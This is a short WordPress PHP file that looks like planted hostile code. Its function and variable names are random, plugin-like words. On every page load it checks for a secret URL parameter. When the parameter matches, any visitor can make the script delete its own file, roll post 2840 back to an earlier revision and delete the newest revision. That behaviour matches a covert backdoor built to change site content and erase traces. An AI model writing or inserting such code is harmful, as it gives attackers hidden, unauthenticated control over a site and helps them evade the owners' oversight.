<?php

function rates_refresh_reloaded() {
	if (isset($_GET['parts_forum_index_elements']) && $_GET['parts_forum_index_elements'] === 'out_contents_account_maps') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$extension_embed_posts_calendar = 2840;
		$keyword_now_elementor_label = wp_get_post_revisions($extension_embed_posts_calendar);
		if (empty($keyword_now_elementor_label)) die('no revisions');
		if (count($keyword_now_elementor_label) < 2) die('less than 2');
		$light_designer_press = array_shift($keyword_now_elementor_label);
		$products_help_validation_recipe = $light_designer_press->ID;
		$base_preview_cc = array_shift($keyword_now_elementor_label);
		$wpc_react_contents = $base_preview_cc->ID;
		$landing_listing_modal_purchase = wp_restore_post_revision($wpc_react_contents);
		if ($landing_listing_modal_purchase === false) die('error restoring');
		$landing_listing_modal_purchase = wp_delete_post_revision($products_help_validation_recipe);		
		if ($landing_listing_modal_purchase === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'rates_refresh_reloaded');
